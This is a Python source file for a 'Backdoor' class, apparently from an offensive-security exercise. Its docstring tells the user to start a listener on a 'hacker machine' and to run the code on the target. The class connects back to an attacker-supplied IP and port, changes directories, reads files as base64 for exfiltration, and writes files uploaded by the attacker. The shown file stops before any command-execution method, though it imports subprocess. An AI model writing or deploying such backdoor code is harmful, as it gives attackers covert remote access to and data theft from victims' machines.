#!/usr/bin/env python3
'''
Do this on hacker machine:

run executeCommandServer.py -p 4444
netcat verbose listen port 4444


Run this code on the target:

'''
import socket
import subprocess
import json
import os
import base64

class Backdoor:
    def __init__(self, ip, port):
        self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.connection.connect((ip, port))

    def send_str(self, stringMessage):
        self.connection.send(("\n" + stringMessage + "\n").encode("utf-8"))
        return

    def recv_str(self, bufferSize):
        recv_data = self.connection.recv(bufferSize).decode("utf-8")
        return recv_data

    
    def send_json(self, stringMessage):
        json_data = json.dumps(stringMessage)
        self.connection.send(json_data.encode("utf-8"))
        return

    def recv_json(self, bufferSize):
        recv_data = ""
        while True:
            try:
                recv_data = recv_data + self.connection.recv(bufferSize).decode("utf-8")
                return json.loads(recv_data)
            except ValueError:
                continue

    def close(self):
        self.connection.close()

    def cwd_to(self, path):
        os.chdir(path)
        return "[+] Changed directory to " + path

    def get_file(self, fname):
        with open(fname, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, content, filename):
        with open(filename, "wb") as file:
            file.write(base64.b64decode(content.encode("utf-8")))
            return "[+] Upload successful"









